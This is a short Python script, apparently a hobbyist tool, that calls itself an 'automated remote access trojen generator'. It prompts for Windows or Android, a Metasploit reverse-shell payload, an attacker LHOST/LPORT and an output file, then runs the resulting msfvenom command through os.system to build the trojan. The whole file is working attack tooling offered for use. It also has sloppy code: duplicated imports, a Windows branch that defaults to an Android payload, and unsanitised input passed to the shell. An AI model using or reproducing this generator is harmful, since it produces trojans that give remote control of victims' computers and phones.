import os
import time
from colorama import Fore, Style

def print_with_animation(text):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(0.03)  # Adjust the sleep duration for speed
    print()
    
def print_colored_figlet_text(text, color):
    os.system(f"figlet -f slant '{text}' > temp_figlet.txt")  # Generate figlet text to a temporary file
    with open("temp_figlet.txt", "r") as file:
        figlet_output = file.read()
    os.remove("temp_figlet.txt")  # Remove temporary file

    colored_text = f"{color}{figlet_output}{Style.RESET_ALL}"  # Apply color after figlet
    print(colored_text) 


def select_platform():
    print_with_animation(f"{Fore.YELLOW}Choose a platform:")
    print_with_animation(f"{Fore.BLUE}1. Windows")
    print_with_animation("2. Android")
    platform_choice = input("Enter the platform number: ")
    if platform_choice == '1':
        return "windows"
    elif platform_choice == '2':
        return "android"
    else:
        print_with_animation(f"{Fore.RED}Invalid choice. Defaulting to Windows.")
        return "windows"



























import os
import time
from colorama import Fore, Style

# Rest of your code remains the same

def select_payload(platform):
    print_with_animation(f"Available payloads for {platform}:")
    if platform == "windows":
        print_with_animation(f"{Fore.GREEN}1. windows/meterpreter/reverse_tcp")
        print_with_animation("2. windows/shell/reverse_tcp")
        payload_choice = input("Enter the payload number: ")
        if payload_choice == '1':
            return "windows/meterpreter/reverse_tcp"
        elif payload_choice == '2':
            return "windows/shell/reverse_tcp"
        else:
            print_with_animation(f"{Fore.RED}Invalid choice. Defaulting to android/meterpreter/reverse_tcp.")
            return "android/meterpreter/reverse_tcp"
    elif platform == "android":
        print_with_animation(f"{Fore.GREEN}1. android/meterpreter/reverse_tcp")
        print_with_animation("2. android/shell/reverse_tcp")
        payload_choice = input("Enter the payload number: ")
        if payload_choice == '1':
            return "android/meterpreter/reverse_tcp"
        elif payload_choice == '2':
            return "android/shell/reverse_tcp"
        else:
            print_with_animation(f"{Fore.RED}Invalid choice. Defaulting to android/meterpreter/reverse_tcp.")
            return "android/meterpreter/reverse_tcp"
    else:
        print_with_animation(f"{Fore.RED}Invalid choice. Defaulting to android/meterpreter/reverse_tcp.")
        return "android/meterpreter/reverse_tcp"

# Rest of your code remains the same


def generate_payload():
    print_colored_figlet_text("KORISHEE THE CYBERMASTER", Fore.GREEN)
    print_with_animation(f"{Fore.RED}PRESENTING A AUTOMATED REMOTE ACCESS TROJEN GENERATOR FROM")
    
    
    
    print_with_animation(f"{Fore.YELLOW}Let's generate a payload using msfvenom.")
    
    # Ask for the platform first
    platform = select_platform()

    # Select the payload based on the platform
    payload = select_payload(platform)

    lhost = input("Enter the LHOST (e.g., 192.168.1.100): ")
    lport = input("Enter the LPORT (e.g., 4444): ")
    output_file = input("Enter the output file name with extension: ")

    # Construct the msfvenom command
    command = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -o {output_file}"

    # Run msfvenom with the constructed command using os.system
    try:
        print_with_animation(f"{Fore.CYAN}Generating payload...")
        time.sleep(2)  # Simulating payload generation time (you can adjust this)
        os.system(command)
        print_with_animation(f"{Fore.GREEN}Payload generated successfully! File saved as {output_file}")
    except Exception as e:
        print_with_animation(f"{Fore.RED}Error: {e}")

# Generate the payload
# Example usage:
generate_payload()
